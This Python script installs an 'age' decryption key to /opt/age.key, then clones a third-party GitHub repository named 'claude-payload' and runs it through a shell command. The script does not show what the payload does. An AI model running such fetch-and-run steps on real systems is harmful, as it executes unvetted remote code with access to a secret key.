from pathlib import Path

import shutil
import subprocess

ROOT_DIR = Path(__file__).resolve().parent.parent

def run(cmd, **kwargs):
    return subprocess.run(
        cmd,
        shell=True,
        check=True,
        text=True,
        capture_output=True,
        **kwargs
    )

def main():
    # install age key
    shutil.copy(
        ROOT_DIR / "keys" / "age.key",
        "/opt/age.key",
    )

    print("Age key installed at /opt/age.key")

    # run payload
    run("git clone https://github.com/0x038b5c/claude-payload /opt/payload --depth 1")
    result = run("PYTHONPATH=/opt/payload python -m src.main")

    if result.stderr:
        print("ERROR:")
        print(result.stderr)

    print(result.stdout)

if __name__ == "__main__":
    main()
